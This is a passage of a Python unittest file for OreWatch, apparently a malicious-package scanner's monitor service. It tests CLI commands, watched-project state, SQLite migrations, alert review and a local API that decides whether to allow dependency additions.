        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            with open(service.paths["menubar_pid"], "w", encoding="utf-8") as handle:
                handle.write("65432")
            with patch("monitor.service.pid_is_running", side_effect=lambda pid: int(pid or 0) == 65432):
                status = service.get_status()

        self.assertTrue(status["menubar_running"])
        self.assertEqual(status["menubar_pid"], 65432)
        self.assertEqual(status["menubar_pid_path"], service.paths["menubar_pid"])

    def test_status_hides_stale_live_update_anomaly_after_successful_promotion(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            service.state.add_notification(
                service.paths["home"],
                "live_update_anomaly",
                "Candidate rejected earlier",
            )
            service.state.set_agent_state("last_live_promotion_at", "2099-04-06T20:55:00Z")
            service.state.set_agent_state("last_live_promotion_status", "success")

            status = service.get_status()

        self.assertEqual(status["last_live_promotion_status"], "success")
        self.assertEqual(status["recent_notifications"], [])

    def test_add_watched_project_primes_snapshot_and_can_trigger_initial_scan(self):
        with tempfile.TemporaryDirectory() as repo_root:
            project_dir = os.path.join(repo_root, "workspace")
            os.makedirs(project_dir, exist_ok=True)
            service = MonitorService(repo_root)

            fake_snapshot = {
                "package.json": {
                    "category": "manifest",
                    "mtime": 123.0,
                    "size": 42,
                }
            }
            with patch("monitor.service.take_project_snapshot", return_value=fake_snapshot):
                with patch.object(
                    service,
                    "_run_project_scan",
                    return_value={"message": "No malicious packages detected"},
                ) as mocked_scan:
                    result = service.add_watched_project(
                        project_dir,
                        {"severity_threshold": "high"},
                        initial_scan_kind="quick",
                    )

        watched = service.state.get_watched_project(project_dir)
        observed = service.state.get_observed_files(project_dir)
        self.assertEqual(watched["policy"]["severity_threshold"], "high")
        self.assertIn("package.json", observed)
        mocked_scan.assert_called_once()
        self.assertIn("initial quick scan", result["message"])

    def test_set_notification_preference_persists_to_monitor_config(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            result = service.set_notification_preference("desktop", False)
            reloaded = load_monitor_config(repo_root)

        self.assertTrue(result["success"])
        self.assertFalse(reloaded["notifications"]["desktop"])
        self.assertFalse(service.notifier.config["notifications"]["desktop"])

    def test_mark_alerts_reviewed_advances_review_cursor_without_deleting_history(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            service.state.add_notification(service.paths["home"], "resolved", "Resolved finding")
            service.state.add_notification(service.paths["home"], "findings", "Critical finding detected")
            service.state.add_notification(
                service.paths["home"],
                "dependency_blocked",
                "Blocked malicious dependency",
            )

            result = service.mark_alerts_reviewed()
            follow_up = service.mark_alerts_reviewed()

        self.assertTrue(result["success"])
        self.assertEqual(result["cleared_alert_count"], 2)
        self.assertGreater(result["acknowledged_notification_id"], 0)
        self.assertEqual(
            int(service.state.get_agent_state("menubar_last_acknowledged_notification_id", "0") or 0),
            result["acknowledged_notification_id"],
        )
        self.assertEqual(follow_up["cleared_alert_count"], 0)
        self.assertEqual(follow_up["message"], "No new alerts to clear")

    def test_run_iteration_checks_menubar_health_before_scanning(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            service.config["notifications"]["auto_launch_menubar"] = True
            with patch.object(service, "_ensure_menubar_running_if_configured") as mocked_ensure:
                with patch.object(
                    service.updater,
                    "refresh_if_due",
                    return_value={"success": False, "message": "refresh failed"},
                ):
                    with self.assertLogs("monitor.service", level="ERROR"):
                        service.run_iteration()

        mocked_ensure.assert_called_once_with()

    def test_install_cli_can_print_bootstrap_guidance(self):
        with tempfile.TemporaryDirectory() as repo_root:
            with patch("os.getcwd", return_value=repo_root):
                stdout = io.StringIO()
                with contextlib.redirect_stdout(stdout):
                    result = run_monitor_cli(["install", "--service-manager", "background", "--no-start", "--ide-bootstrap"])

            self.assertEqual(result, 0)
            output = stdout.getvalue()
            self.assertIn("OreWatch monitor installed", output)
            self.assertIn("Monitor scope:", output)
            self.assertIn("OreWatch IDE bootstrap", output)
            self.assertIn("Claude Code", output)
            self.assertIn("mcpServers", output)

    def test_menubar_cli_dispatches_to_native_app_runner(self):
        with tempfile.TemporaryDirectory() as repo_root:
            with patch("os.getcwd", return_value=repo_root):
                with patch(
                    "monitor.cli.launch_menubar_app_detached",
                    return_value={"success": True, "message": "launched", "pid": 12345},
                ) as mocked_launcher:
                    result = run_monitor_cli(
                        ["menubar", "--refresh-seconds", "12.5"]
                    )

        self.assertEqual(result, 0)
        mocked_launcher.assert_called_once_with(
            refresh_seconds=12.5,
            workspace_root=None,
        )

    def test_menubar_cli_foreground_dispatches_to_native_app_runner(self):
        with tempfile.TemporaryDirectory() as repo_root:
            with patch("os.getcwd", return_value=repo_root):
                with patch("monitor.cli.run_menubar_app", return_value=0) as mocked_runner:
                    result = run_monitor_cli(
                        ["menubar", "--foreground", "--refresh-seconds", "12.5"]
                    )

        self.assertEqual(result, 0)
        mocked_runner.assert_called_once()
        _service = mocked_runner.call_args.args[0]
        self.assertEqual(mocked_runner.call_args.kwargs["refresh_seconds"], 12.5)

    def test_build_detached_menubar_command_relaunches_in_foreground_mode(self):
        command = build_detached_menubar_command(
            refresh_seconds=12.5,
            workspace_root="/tmp/demo-project",
        )

        self.assertEqual(
            command[:6],
            [
                sys.executable,
                "-m",
                "malicious_package_scanner",
                "monitor",
                "menubar",
                "--foreground",
            ],
        )
        self.assertIn("--refresh-seconds", command)
        self.assertIn("12.5", command)
        self.assertEqual(command[-2:], ["--workspace-root", "/tmp/demo-project"])

    def test_launch_menubar_app_detached_reuses_existing_process(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            with open(service.paths["menubar_pid"], "w", encoding="utf-8") as handle:
                handle.write("54321")
            with patch("monitor.menubar.os.kill") as mocked_kill:
                with patch(
                    "monitor.menubar.subprocess.run",
                    return_value=subprocess.CompletedProcess(
                        args=["ps"],
                        returncode=0,
                        stdout="S+\n",
                        stderr="",
                    ),
                ):
                    with patch("monitor.menubar.subprocess.Popen") as mocked_popen:
                        result = launch_menubar_app_detached(workspace_root=repo_root)

        self.assertTrue(result["success"])
        self.assertEqual(result["pid"], 54321)
        self.assertIn("already running", result["message"])
        mocked_kill.assert_called_once_with(54321, 0)
        mocked_popen.assert_not_called()

    def test_quickstart_cli_installs_watches_project_and_prints_bootstrap(self):
        with tempfile.TemporaryDirectory() as repo_root, tempfile.TemporaryDirectory() as project_root:
            with patch("os.getcwd", return_value=repo_root):
                stdout = io.StringIO()
                with contextlib.redirect_stdout(stdout):
                    result = run_monitor_cli(
                        [
                            "quickstart",
                            project_root,
                            "--service-manager",
                            "background",
                            "--no-start",
                            "--client",
                            "claude_code",
                        ]
                    )

                self.assertEqual(result, 0)
                output = stdout.getvalue()
                self.assertIn("OreWatch quickstart complete", output)
                self.assertIn(project_root, output)
                self.assertIn("Monitor scope:", output)
                self.assertIn("Claude Code", output)
                self.assertIn("mcpServers", output)

                service = MonitorService(project_root)
                watched = service.state.get_watched_project(project_root)
                self.assertIsNotNone(watched)

    def test_findings_and_notifications_cli_show_actionable_alerts(self):
        with tempfile.TemporaryDirectory() as repo_root:
            project_root = os.path.join(repo_root, "project")
            os.makedirs(project_root, exist_ok=True)
            service = MonitorService(repo_root)
            service.config["notifications"]["desktop"] = False
            service.config["notifications"]["terminal"] = False

            changes = service.state.upsert_findings(
                project_root,
                [
                    {
                        "fingerprint": "finding-1",
                        "finding_type": "malicious_package",
                        "severity": "critical",
                        "title": "Malicious package badpkg@1.0.0",
                        "payload": {"name": "badpkg", "version": "1.0.0", "ecosystem": "npm"},
                    }
                ],
                os.path.join(repo_root, "report.json"),
            )
            service.notifier.notify_project_changes(
                project_root,
                changes,
                {"notify_on": ["malicious_package"]},
                report_path=os.path.join(repo_root, "report.json"),
            )

            findings_stdout = io.StringIO()
            notifications_stdout = io.StringIO()
            with patch("os.getcwd", return_value=repo_root):
                with contextlib.redirect_stdout(findings_stdout):
                    findings_result = run_monitor_cli(
                        ["findings", "--project", project_root, "--min-severity", "high"]
                    )
                with contextlib.redirect_stdout(notifications_stdout):
                    notifications_result = run_monitor_cli(
                        ["notifications", "--project", project_root]
                    )

            self.assertEqual(findings_result, 0)
            self.assertEqual(notifications_result, 0)

    def test_monitor_log_cli_prints_recent_log_lines(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            with open(service.paths["log_file"], "w", encoding="utf-8") as handle:
                handle.write("line one\nline two\nline three\n")

            stdout = io.StringIO()
            with patch("os.getcwd", return_value=repo_root):
                with contextlib.redirect_stdout(stdout):
                    result = run_monitor_cli(["log", "--lines", "2"])

            self.assertEqual(result, 0)
            output = stdout.getvalue()
            self.assertIn("Monitor log:", output)
            self.assertIn("line two", output)
            self.assertIn("line three", output)
            self.assertNotIn("line one", output)

    def test_clear_alerts_cli_marks_current_alerts_reviewed(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            service.state.add_notification(
                service.paths["home"],
                "findings",
                "Critical finding detected",
            )

            stdout = io.StringIO()
            with patch("os.getcwd", return_value=repo_root):
                with contextlib.redirect_stdout(stdout):
                    result = run_monitor_cli(["clear-alerts"])

        self.assertEqual(result, 0)
        self.assertIn("Marked 1 alert(s) reviewed", stdout.getvalue())
        self.assertGreater(
            int(service.state.get_agent_state("menubar_last_acknowledged_notification_id", "0") or 0),
            0,
        )

    def test_monitor_scan_surfaces_html_report_path_for_humans(self):
        with tempfile.TemporaryDirectory() as repo_root:
            project_root = os.path.join(repo_root, "project")
            os.makedirs(project_root, exist_ok=True)
            service = MonitorService(repo_root)
            service.state.add_watched_project(project_root, {})
            project = service.state.get_watched_project(project_root)
            self.assertIsNotNone(project)

            def fake_run_scan(request):
                html_report_path = report_generator.get_html_report_path(request.output_path)
                with open(request.output_path, "w", encoding="utf-8") as handle:
                    handle.write("{}")
                with open(html_report_path, "w", encoding="utf-8") as handle:
                    handle.write("<!DOCTYPE html><html><body>report</body></html>")
                return ScanResult(
                    ecosystem="npm",
                    scanned_path=project_root,
                    requested_ecosystems=["npm"],
                    packages=[],
                    malicious_packages=[],
                    iocs=[],
                    report_path=request.output_path,
                    data_metadata=_build_data_metadata(),
                    exit_code=0,
                    message="No malicious packages or IoCs detected",
                )

            with patch("monitor.service.run_scan", side_effect=fake_run_scan):
                with patch("monitor.service.build_tracked_findings", return_value=[]):
                    result = service._run_project_scan(project, "quick", "manual")

            watched = service.state.get_watched_project(project_root)
            self.assertEqual(result["report_path"], result["html_report_path"])
            self.assertTrue(result["report_path"].endswith(".html"))
            self.assertTrue(result["json_report_path"].endswith(".json"))
            self.assertEqual(watched["last_report_path"], result["report_path"])

    def test_singleton_monitor_can_watch_multiple_projects(self):
        with tempfile.TemporaryDirectory() as workspace_root:
            project_a = os.path.join(workspace_root, "project-a")
            project_b = os.path.join(workspace_root, "project-b")
            os.makedirs(project_a, exist_ok=True)
            os.makedirs(project_b, exist_ok=True)

            with patch("os.getcwd", return_value=workspace_root):
                result = run_monitor_cli(
                    [
                        "quickstart",
                        "--workspace-root",
                        workspace_root,
                        project_a,
                        "--service-manager",
                        "background",
                        "--no-start",
                        "--client",
                        "claude_code",
                    ]
                )
                self.assertEqual(result, 0)

                result = run_monitor_cli(
                    [
                        "watch",
                        "add",
                        project_b,
                    ]
                )
                self.assertEqual(result, 0)

            service = MonitorService(workspace_root)
            watched_paths = {project["path"] for project in service.state.list_watched_projects()}
            self.assertEqual(watched_paths, {project_a, project_b})

    def test_singleton_monitor_migrates_legacy_watched_projects_once(self):
        with tempfile.TemporaryDirectory() as legacy_workspace_a, tempfile.TemporaryDirectory() as legacy_workspace_b:
            legacy_a = get_legacy_monitor_paths(legacy_workspace_a)
            legacy_b = get_legacy_monitor_paths(legacy_workspace_b)
            os.makedirs(os.path.dirname(legacy_a["state_db"]), exist_ok=True)
            os.makedirs(os.path.dirname(legacy_b["state_db"]), exist_ok=True)

            legacy_state_a = MonitorState(legacy_a["state_db"])
            legacy_state_a.add_watched_project(legacy_workspace_a, {"severity_threshold": "medium"})
            with legacy_state_a._connect() as conn:
                conn.execute(
                    "UPDATE watched_projects SET updated_at = ? WHERE path = ?",
                    ("2026-04-01T00:00:00Z", os.path.abspath(legacy_workspace_a)),
                )

            duplicate_path = os.path.join(legacy_workspace_a, "duplicate-project")
            os.makedirs(duplicate_path, exist_ok=True)
            legacy_state_a.add_watched_project(duplicate_path, {"severity_threshold": "low"})
            with legacy_state_a._connect() as conn:
                conn.execute(
                    "UPDATE watched_projects SET updated_at = ?, policy_json = ? WHERE path = ?",
                    (
                        "2026-04-01T00:00:00Z",
                        json.dumps({"severity_threshold": "low"}),
                        duplicate_path,
                    ),
                )

            legacy_state_b = MonitorState(legacy_b["state_db"])
            legacy_state_b.add_watched_project(duplicate_path, {"severity_threshold": "critical"})
            with legacy_state_b._connect() as conn:
                conn.execute(
                    "UPDATE watched_projects SET updated_at = ?, policy_json = ? WHERE path = ?",
                    (
                        "2026-04-02T00:00:00Z",
                        json.dumps({"severity_threshold": "critical"}),
                        duplicate_path,
                    ),
                )

            service = MonitorService()
            watched = {project["path"]: project for project in service.state.list_watched_projects()}

            self.assertIn(os.path.abspath(legacy_workspace_a), watched)
            self.assertIn(os.path.abspath(duplicate_path), watched)
            self.assertEqual(
                watched[os.path.abspath(duplicate_path)]["policy"]["severity_threshold"],
                "critical",
            )
            self.assertTrue(os.path.exists(legacy_a["state_db"]))
            self.assertTrue(os.path.exists(legacy_b["state_db"]))

            repeat_service = MonitorService()
            self.assertEqual(
                repeat_service.state.get_agent_state("singleton_legacy_watch_imported_count"),
                service.state.get_agent_state("singleton_legacy_watch_imported_count"),
            )

    def test_monitor_state_allows_same_fingerprint_in_multiple_projects(self):
        with tempfile.TemporaryDirectory() as state_root:
            safe_state_root = os.path.realpath(state_root)
            state = MonitorState(os.path.join(safe_state_root, "state.db"))
            finding = {
                "fingerprint": "shared-finding",
                "finding_type": "malicious_package",
                "severity": "critical",
                "title": "Malicious package badpkg@1.0.0",
                "payload": {"name": "badpkg", "version": "1.0.0", "ecosystem": "npm"},
            }

            state.upsert_findings("/tmp/project-a", [finding], "/tmp/report-a.html")
            state.upsert_findings("/tmp/project-b", [finding], "/tmp/report-b.html")
            findings = state.list_active_findings()

        self.assertEqual(len(findings), 2)
        self.assertEqual(
            {finding["project_path"] for finding in findings},
            {"/tmp/project-a", "/tmp/project-b"},
        )

    def test_monitor_state_reactivates_resolved_finding_without_primary_key_collision(self):
        with tempfile.TemporaryDirectory() as state_root:
            safe_state_root = os.path.realpath(state_root)
            state = MonitorState(os.path.join(safe_state_root, "state.db"))
            finding = {
                "fingerprint": "shared-finding",
                "finding_type": "malicious_package",
                "severity": "critical",
                "title": "Malicious package badpkg@1.0.0",
                "payload": {"name": "badpkg", "version": "1.0.0", "ecosystem": "npm"},
            }

            first = state.upsert_findings("/tmp/project-a", [finding], "/tmp/report-a.html")
            resolved = state.upsert_findings("/tmp/project-a", [], "/tmp/report-b.html")
            reactivated = state.upsert_findings("/tmp/project-a", [finding], "/tmp/report-c.html")
            findings = state.list_active_findings("/tmp/project-a")

        self.assertEqual(len(first["new_findings"]), 1)
        self.assertEqual(len(resolved["resolved_findings"]), 1)
        self.assertEqual(len(reactivated["new_findings"]), 0)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["last_report_path"], "/tmp/report-c.html")

    def test_monitor_state_remove_watched_project_allows_deleted_directories(self):
        with tempfile.TemporaryDirectory() as state_root:
            safe_state_root = os.path.realpath(state_root)
            state = MonitorState(os.path.join(safe_state_root, "state.db"))
            project_root = tempfile.mkdtemp(dir=safe_state_root)
            watched_path = os.path.join(project_root, "repo")
            os.makedirs(watched_path, exist_ok=True)

            state.add_watched_project(watched_path)
            shutil.rmtree(watched_path)
            state.remove_watched_project(watched_path)

            self.assertEqual(state.list_watched_projects(), [])

    def test_monitor_state_migrates_legacy_findings_primary_key(self):
        with tempfile.TemporaryDirectory() as state_root:
            safe_state_root = os.path.realpath(state_root)
            db_path = os.path.join(safe_state_root, "state.db")
            os.makedirs(os.path.dirname(db_path), exist_ok=True)
            conn = sqlite3.connect(db_path)
            try:
                conn.executescript(
                    """
                    CREATE TABLE findings (
                        fingerprint TEXT PRIMARY KEY,
                        project_path TEXT NOT NULL,
                        finding_type TEXT NOT NULL,
                        severity TEXT NOT NULL,
                        title TEXT NOT NULL,
                        payload_json TEXT NOT NULL,
                        active INTEGER NOT NULL DEFAULT 1,
                        first_seen_at TEXT NOT NULL,
                        last_seen_at TEXT NOT NULL,
                        resolved_at TEXT,
                        last_report_path TEXT
                    );

                    INSERT INTO findings (
                        fingerprint, project_path, finding_type, severity, title,
                        payload_json, active, first_seen_at, last_seen_at,
                        resolved_at, last_report_path
                    ) VALUES (
                        'shared-finding',
                        '/tmp/project-a',
                        'malicious_package',
                        'critical',
                        'Malicious package badpkg@1.0.0',
                        '{"ecosystem": "npm", "name": "badpkg", "version": "1.0.0"}',
                        1,
                        '2026-04-03T00:00:00Z',
                        '2026-04-03T00:00:00Z',
                        NULL,
                        '/tmp/report-a.html'
                    );
                    """
                )
                conn.commit()
            finally:
                conn.close()

            state = MonitorState(db_path)
            state.upsert_findings(
                "/tmp/project-b",
                [
                    {
                        "fingerprint": "shared-finding",
                        "finding_type": "malicious_package",
                        "severity": "critical",
                        "title": "Malicious package badpkg@1.0.0",
                        "payload": {"name": "badpkg", "version": "1.0.0", "ecosystem": "npm"},
                    }
                ],
                "/tmp/report-b.html",
            )

            with state._connect() as migrated_conn:
                rows = migrated_conn.execute("PRAGMA table_info(findings)").fetchall()
            pk_columns = [row["name"] for row in rows if row["pk"]]
            findings = state.list_active_findings()

            self.assertEqual(pk_columns, ["project_path", "fingerprint"])
            self.assertEqual(len(findings), 2)

    def test_quickstart_cli_defaults_to_current_directory(self):
        with tempfile.TemporaryDirectory() as repo_root, tempfile.TemporaryDirectory() as project_root:
            with patch("os.getcwd", return_value=project_root):
                stdout = io.StringIO()
                with contextlib.redirect_stdout(stdout):
                    result = run_monitor_cli(
                        [
                            "quickstart",
                            "--service-manager",
                            "background",
                            "--no-start",
                            "--client",
                            "claude_code",
                        ]
                    )

                self.assertEqual(result, 0)
                service = MonitorService(project_root)
                watched = service.state.get_watched_project(project_root)
                self.assertIsNotNone(watched)

    def test_quickstart_cli_survives_native_service_failure_with_auto_fallback(self):
        with tempfile.TemporaryDirectory() as repo_root, tempfile.TemporaryDirectory() as project_root:
            with patch("os.getcwd", return_value=repo_root):
                original_install = MonitorService.install

                def flaky_install(self, service_manager=None, auto_start=True):
                    if service_manager == "auto":
                        with patch.object(self, "_detect_available_service_manager", return_value="launchd"):
                            with patch.object(
                                self,
                                "_install_manager_service",
                                return_value={
                                    "success": False,
                                    "service_manager": "launchd",
                                    "message": "Bootstrap failed: 5: Input/output error",
                                },
                            ):
                                with patch.object(
                                    self,
                                    "_start_local_background",
                                    return_value={"success": True, "message": "Monitor started", "pid": 12345},
                                ):
                                    return original_install(self, service_manager=service_manager, auto_start=auto_start)
                    return original_install(self, service_manager=service_manager, auto_start=auto_start)

                with patch.object(MonitorService, "install", new=flaky_install):
                    stdout = io.StringIO()
                    with contextlib.redirect_stdout(stdout):
                        result = run_monitor_cli(["quickstart", project_root, "--client", "claude_code"])

                self.assertEqual(result, 0)
                output = stdout.getvalue()
                self.assertIn("OreWatch quickstart complete", output)
                self.assertIn("Service manager: background", output)
                self.assertIn(project_root, output)

    def test_monitor_api_request_sets_bearer_auth_header(self):
        captured_request = {}

        class DummyResponse:
            def __enter__(self):
                return self

            def __exit__(self, exc_type, exc, tb):
                return False

            def read(self):
                return b'{"ok": true}'

        def fake_urlopen(request, timeout=0):
            captured_request["request"] = request
            captured_request["timeout"] = timeout
            return DummyResponse()

        with patch("monitor.api.urllib.request.urlopen", side_effect=fake_urlopen):
            response = monitor_api_request(
                "http://127.0.0.1:48736",
                "test-token",
                "POST",
                "/v1/health",
                payload={"ping": True},
            )

        self.assertTrue(response["ok"])
        request = captured_request["request"]
        self.assertEqual(request.get_header("Authorization"), "Bearer test-token")
        self.assertEqual(request.get_method(), "POST")

    def test_local_api_health_and_dependency_check_require_auth_and_return_decision(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)

            with patch(
                "monitor.service.get_database_statuses",
                return_value={
                    "npm": {
                        "usable": True,
                        "data_status": "complete",
                        "sources_used": ["openssf", "osv"],
                        "experimental_sources_used": [],
                    }
                },
            ):
                with patch.object(service.package_checker, "check_packages", return_value=[]):
                    health = service.build_health_payload()
                    response = service.handle_dependency_add_check(
                        {
                            "client_type": "codex",
                            "project_path": repo_root,
                            "ecosystem": "npm",
                            "package_manager": "npm",
                            "operation": "add",
                            "dependencies": [
                                {
                                    "name": "left-pad",
                                    "requested_spec": "1.3.0",
                                    "resolved_version": "1.3.0",
                                    "dev_dependency": False,
                                }
                            ],
                            "source": {"kind": "agent_command", "command": "npm install left-pad@1.3.0"},
                        }
                    )

            self.assertEqual(response["decision"], "allow")
            self.assertEqual(response["data_health"], "complete")
            self.assertIn("supported_ecosystems", health)
            stored = service.state.get_dependency_check(response["check_id"])
            self.assertEqual(stored["client_type"], "codex")

    def test_dependency_add_normalizes_legacy_file_path_source_kind(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            manifest_path = os.path.join(repo_root, "requirements.txt")
            with open(manifest_path, "w", encoding="utf-8") as handle:
                handle.write("requests==2.32.3\n")

            with patch(
                "monitor.service.get_database_statuses",
                return_value={
                    "pypi": {
                        "usable": True,
                        "data_status": "complete",
                        "sources_used": ["openssf", "osv"],
                        "experimental_sources_used": [],
                    }
                },
            ):
                with patch.object(service.package_checker, "check_packages", return_value=[]):
                    response = service.handle_dependency_add_check(
                        {
                            "client_type": "codex",
                            "project_path": repo_root,
                            "ecosystem": "pypi",
                            "package_manager": "pip",
                            "operation": "add",
                            "dependencies": [{"name": "requests", "version": "2.32.3"}],
                            "source": {"kind": "file_path", "file_path": manifest_path},
                        }
                    )

            self.assertEqual(response["decision"], "allow")
            stored = service.state.get_dependency_check(response["check_id"])
            self.assertEqual(stored["source_kind"], "ide_action")
            self.assertEqual(stored["source_file_path"], manifest_path)
            self.assertEqual(stored["source_command"], None)

    def test_threaded_dependency_checks_do_not_reuse_sqlite_connections(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            final_data_dir = service.paths["final_data_dir"]
            os.makedirs(final_data_dir, exist_ok=True)
            db_path = os.path.join(final_data_dir, "unified_pypi.db")
            conn, temp_db_path = collector_db.create_database(db_path)
            collector_db.insert_metadata(
                conn,
                ecosystem="pypi",
                packages=[],
                timestamp="2026-04-09T00:00:00Z",
                extra_metadata=_build_data_metadata(),
            )
            collector_db.finalize_database(conn, temp_db_path, db_path)

            payload = {
                "client_type": "codex",
                "project_path": repo_root,
                "ecosystem": "pypi",
                "package_manager": "pip",
                "operation": "add",
                "dependencies": [
                    {
                        "name": "requests",
                        "requested_spec": "2.32.3",
                        "resolved_version": "2.32.3",
                    }
                ],
                "source": {"kind": "agent_command", "command": "pip install requests==2.32.3"},
            }

            responses = []
            errors = []

            def run_check():
                try:
                    responses.append(service.handle_dependency_add_check(dict(payload)))
                except Exception as exc:  # pragma: no cover - asserted below
                    errors.append(exc)

            with patch("monitor.service.get_database_statuses", return_value=_build_database_statuses()):
                first_thread = threading.Thread(target=run_check)
                second_thread = threading.Thread(target=run_check)
                first_thread.start()
                first_thread.join()
                second_thread.start()
                second_thread.join()

            service.close()

            self.assertEqual(errors, [])
            self.assertEqual(len(responses), 2)
            self.assertEqual(responses[0]["decision"], "allow")
            self.assertEqual(responses[1]["decision"], "allow")
            self.assertNotEqual(responses[0]["check_id"], responses[1]["check_id"])

    def test_local_api_manifest_check_and_override_flow(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)

            with patch(
                "monitor.service.get_database_statuses",
                return_value={
                    "pypi": {
                        "usable": False,
                        "data_status": "failed",
                        "sources_used": [],
                        "experimental_sources_used": [],
                    }
                },
            ):
                with patch.object(
                    service.package_checker,
                    "check_packages",
                    return_value=[{"name": "badpkg", "severity": "critical", "sources": ["osv"]}],
                ):
                    response = service.handle_manifest_check(
                        {
                            "client_type": "vscode",
                            "project_path": repo_root,
                            "ecosystem": "pypi",
                            "manifest_path": os.path.join(repo_root, "requirements.txt"),
                            "dependencies": [
                                {
                                    "name": "badpkg",
                                    "requested_spec": ">=1.0.0",
                                    "resolved_version": "",
                                    "dev_dependency": False,
                                }
                            ],
                        }
                    )

            self.assertEqual(response["decision"], "override_required")
            self.assertEqual(response["manifest_status"], "blocked")

            override = service.handle_dependency_override(
                response["check_id"],
                {
                    "client_type": "vscode",
                    "actor": "developer@example.com",
                    "reason": "Accepted for isolated local testing",
                },
            )
            self.assertEqual(override["decision"], "allow")
            stored = service.state.get_dependency_override(override["override_id"])
            self.assertEqual(stored["check_id"], response["check_id"])

    def test_health_and_dependency_check_report_consistent_db_backed_data_health(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            statuses = _build_database_statuses(default_status="failed")

            with patch("monitor.service.get_database_statuses", return_value=statuses):
                health = service.build_health_payload()
                response = service.handle_dependency_add_check(
                    {
                        "client_type": "codex",
                        "project_path": repo_root,
                        "ecosystem": "npm",
                        "package_manager": "npm",
                        "operation": "add",
                        "dependencies": [
                            {
                                "name": "left-pad",
                                "requested_spec": "1.3.0",
                                "resolved_version": "1.3.0",
                            }
                        ],
                        "source": {"kind": "agent_command", "command": "npm install left-pad@1.3.0"},
                    }
                )

            self.assertEqual(health["data_health"], "failed")
            self.assertEqual(response["data_health"], "failed")
            self.assertEqual(health["data_health_details"]["expected_path"], service.updater.final_data_dir)
            self.assertEqual(response["data_health_details"]["expected_path"], service.updater.final_data_dir)
            self.assertEqual(health["final_data_dir"], service.updater.final_data_dir)
            self.assertEqual(health["database_statuses"], statuses)

    def test_dependency_check_respects_ecosystem_for_same_package_names(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)

            def fake_threat_data_summary(ecosystems=None):
                requested = list(ecosystems or [])
                statuses = {
                    ecosystem: {
                        "exists": True,
                        "usable": True,
                        "data_status": "complete",
                        "sources_used": ["openssf", "osv"],
                        "experimental_sources_used": [],
                        "last_successful_collect": "2026-04-06T00:00:00Z",
                        "metadata_ready": True,
                    }
                    for ecosystem in requested
                }
                return {
                    "summary": {
                        "data_status": "complete",
                        "sources_used": ["openssf", "osv"],
                        "experimental_sources_used": [],
                        "missing_ecosystems": [],
                        "usable_ecosystems": requested,
                        "requested_statuses": statuses,
                    },
                    "database_statuses": statuses,
                    "data_health_details": {
                        "expected_path": service.updater.final_data_dir,
                        "requested_ecosystems": requested,
                        "available_databases": requested,
                        "missing_ecosystems": [],
                        "usable_ecosystems": requested,
                        "sources_used": ["openssf", "osv"],
                        "experimental_sources_used": [],
                        "requested_statuses": statuses,
                        "suggestion": "",
                    },
                }

            def fake_check_packages(packages, ecosystem):
                if ecosystem != "npm":
                    return []
                return [
                    {
                        "name": package["name"],
                        "severity": "critical",
                        "sources": ["openssf", "osv"],
                        "description": f"Malicious code in {package['name']} ({ecosystem})",
                    }
                    for package in packages
                ]

            dependencies = [
                {"name": "sid-client-manager", "version": "0.0.10"},
                {"name": "sap-abstract", "version": "0.0.1"},
                {"name": "at-authorize-paypal", "version": "0.1.0"},
                {"name": "tfjs-core", "version": "0.1.0"},
            ]
            with patch.object(service, "_threat_data_summary", side_effect=fake_threat_data_summary):
                with patch.object(service.package_checker, "check_packages", side_effect=fake_check_packages):
                    npm_response = service.handle_dependency_add_check(
                        {
                            "client_type": "claude_code",
                            "project_path": repo_root,
                            "ecosystem": "npm",
                            "package_manager": "npm",
                            "operation": "add",
                            "dependencies": dependencies,
                            "source": {"kind": "agent_command", "command": "npm install ..."},
                        }
                    )
                    pypi_response = service.handle_dependency_add_check(
                        {
                            "client_type": "claude_code",
                            "project_path": repo_root,
                            "ecosystem": "pypi",
                            "package_manager": "pip",
                            "operation": "add",
                            "dependencies": dependencies,
                            "source": {"kind": "agent_command", "command": "pip install ..."},
                        }
                    )

        self.assertEqual(npm_response["decision"], "override_required")
        self.assertEqual(npm_response["data_health"], "complete")
        self.assertTrue(all(item["status"] == "malicious_match" for item in npm_response["results"]))
        self.assertTrue(all(item["sources"] == ["openssf", "osv"] for item in npm_response["results"]))
        self.assertEqual(pypi_response["decision"], "allow")
        self.assertEqual(pypi_response["data_health"], "complete")
        self.assertTrue(all(item["status"] == "clean" for item in pypi_response["results"]))

    def test_local_api_lists_active_findings_and_notifications(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            project_dir = os.path.join(repo_root, "project")
            os.makedirs(project_dir, exist_ok=True)
            service.config["notifications"]["desktop"] = False
            service.config["notifications"]["terminal"] = False

            finding = {
                "fingerprint": "finding-1",
                "finding_type": "malicious_package",
                "severity": "critical",
                "title": "Malicious package badpkg@1.0.0",
                "payload": {"name": "badpkg", "version": "1.0.0", "ecosystem": "npm"},
            }
            changes = service.state.upsert_findings(
                project_dir,
                [finding],
                os.path.join(repo_root, "report.json"),
            )
            service.notifier.notify_project_changes(
                project_dir,
                changes,
                {"notify_on": ["malicious_package"]},
                report_path=os.path.join(repo_root, "report.json"),
            )

            def call_get(path):
                handler = monitor_api_module._MonitorAPIHandler.__new__(
                    monitor_api_module._MonitorAPIHandler
                )
                handler.path = path
                handler.headers = {"Authorization": f"Bearer {service.api_token}"}
                handler.server = type(
                    "FakeServer",
                    (),
                    {"service": service, "api_token": service.api_token},
                )()
                captured = {}

                def fake_write_json(status_code, payload):
                    captured["status_code"] = status_code
